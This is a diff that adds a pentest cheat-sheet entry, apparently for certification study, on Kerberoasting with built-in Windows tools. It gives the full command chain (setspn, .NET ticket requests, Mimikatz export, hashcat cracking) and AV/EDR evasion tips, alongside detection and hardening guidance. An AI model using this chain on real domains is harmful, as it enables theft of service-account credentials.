@@ -1,0 +1,88 @@
+{
+  "id": "ad-setspn-manual",
+  "name": "setspn - Semi-Manual Kerberoast",
+  "command": "setspn.exe -Q */*",
+  "description": "Native Windows tool to list all SPNs in the domain. Combined with .NET KerberosRequestorSecurityToken and Mimikatz kerberos::list /export, enables Kerberoasting with zero offensive tooling — pure living-off-the-land. Useful when Rubeus/PowerView are blocked.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Password Attacks",
+  "subcategory": "Kerberoasting",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "kerberoasting",
+    "living-off-the-land",
+    "setspn",
+    "windows",
+    "lotl"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== LIVING OFF THE LAND: THE FULL CHAIN ===\nThis approach uses ONLY built-in Windows tools — no offensive binaries needed.\nSteps:\n\nSTEP 1 — List all SPNs:\n  setspn.exe -Q */*\n  setspn.exe -T INLANEFREIGHT.LOCAL -Q */*\n\nSTEP 2 — Request ticket for specific SPN via .NET (PowerShell):\n  Add-Type -AssemblyName System.IdentityModel\n  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken\n    -ArgumentList 'MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433'\n  This requests the TGS and caches it in the Kerberos ticket cache.\n\nSTEP 3 — Export all tickets to disk with Mimikatz:\n  mimikatz: kerberos::list /export\n  Creates .kirbi files in current directory\n\nSTEP 4 — Convert .kirbi to hashcat format:\n  Base64 encode: base64 /out:true then kerberos::list /export\n  echo '<base64>' | tr -d '\\n' | base64 -d > sqldev.kirbi\n  python2.7 kirbi2john.py sqldev.kirbi > crack_file\n  sed 's/\\$krb5tgs\\$(.*):(.*)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > sqldev_hashcat\n\nSTEP 5 — Crack:\n  hashcat -m 13100 sqldev_hashcat /usr/share/wordlists/rockyou.txt\n\n=== WHEN TO USE THIS APPROACH ===\n  - Rubeus.exe is flagged by AV/EDR\n  - PowerView import is blocked\n  - You're on a restricted system with only cmd.exe + PowerShell available\n  - LOTL detection gaps make this stealthier in some environments\n\n=== ONE-LINER TO REQUEST ALL SPN TICKETS AT ONCE ===\n  setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |\n    Select-String '^CN' -Context 0,1 |\n    % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken\n      -ArgumentList $_.Context.PostContext[0].Trim() }\n  Then: mimikatz kerberos::list /export",
+  "examples": [
+    {
+      "label": "List all SPNs in domain",
+      "command": "setspn.exe -Q */*"
+    },
+    {
+      "label": "Request ticket for specific SPN (.NET)",
+      "command": "Add-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433'"
+    },
+    {
+      "label": "Request all SPN tickets at once",
+      "command": "setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }"
+    },
+    {
+      "label": "Export cached tickets with Mimikatz",
+      "command": "kerberos::list /export"
+    }
+  ],
+  "references": [
+    {
+      "title": "setspn (Microsoft docs)",
+      "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-kerberoast-crack",
+      "rel": "next",
+      "note": "Crack the roasted hashes."
+    }
+  ],
+  "defense": {
+    "why_it_works": "Built-in setspn.exe -Q */* queries registered SPNs using a native Windows binary - no tools dropped.",
+    "prerequisites": "A domain-joined Windows session.",
+    "impact": "The SPN inventory (roasting targets) gathered with a trusted built-in.",
+    "detection": "[MITRE T1558.003] LDAP queries filtering on servicePrincipalName / userAccountControl (Event 4662; Defender for Identity recon); one host reading roastable-account attributes. setspn.exe execution in process logs (4688).",
+    "artifacts": "setspn.exe command line; LDAP SPN query.",
+    "prevention": "Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.",
+    "evasion": "setspn.exe is a trusted built-in, blending better than PowerView/Rubeus.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+  },
+  "tools": [
+    "setspn"
+  ]
+}
